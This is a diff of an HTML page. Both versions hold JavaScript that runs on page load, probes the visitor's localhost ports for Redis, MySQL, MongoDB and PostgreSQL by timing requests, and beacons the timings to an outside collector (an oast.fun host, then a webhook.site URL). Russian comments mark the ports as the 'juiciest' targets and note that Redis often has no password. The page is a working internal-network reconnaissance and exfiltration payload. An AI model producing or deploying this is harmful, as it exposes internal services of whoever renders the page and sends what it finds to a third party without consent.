@@ -1,34 +1,28 @@
 <!DOCTYPE html>
 <html>
 <body>
-<script>
-    async function scanPorts() {
-        const hook = "https://esqbwjbyepcxrsacleqf2vy5xwjs1cvp1.oast.fun";
-        const targets = {
-            "redis": "http://127.0.0.1:6379",
-            "mysql": "http://127.0.0.1:3306",
-            "postgres": "http://127.0.0.1:5432",
-            "google": "https://google.com" // Для сравнения внешнего пинга
-        };
+    <script>
+        const hook = "https://webhook.site/a792cec2-4ac4-47f4-b6c7-67ac60e6b049";
 
-        let results = {};
-
-        for (const [name, url] of Object.entries(targets)) {
-            const start = performance.now();
-            try {
-                // Используем mode: 'no-cors', чтобы не блокировало сам запрос
-                await fetch(url, { mode: 'no-cors', cache: 'no-store' });
-            } catch (e) {
-                // Ошибка вылетит почти сразу, если порт открыт
-            }
-            results[name] = (performance.now() - start).toFixed(2) + "ms";
+        function probe(url, port) {
+            const start = Date.now();
+            const img = new Image();
+            
+            // Если порт открыт, но это не картинка - сработает onerror, но БЫСТРО
+            // Если порт закрыт - сработает onerror, но МЕДЛЕННО (таймаут)
+            img.onerror = () => {
+                const duration = Date.now() - start;
+                navigator.sendBeacon(`${hook}/PROBE_${port}?time=${duration}`);
+            };
+            
+            img.src = `${url}:${port}/favicon.ico`;
         }
 
-        // Отправка данных на твой вебхук
-        navigator.sendBeacon(hook + "/PORT_SCAN_RESULTS", JSON.stringify(results));
-    }
-
-    scanPorts();
-</script>
+        // Проверяем самые сочные порты
+       probe("http://127.0.0.1", "6379"); // Redis (часто без пароля внутри)
+probe("http://127.0.0.1", "3306"); // MySQL
+probe("http://127.0.0.1", "27017"); // MongoDB
+probe("http://127.0.0.1", "5432"); // PostgreSQL
+    </script>
 </body>
 </html>
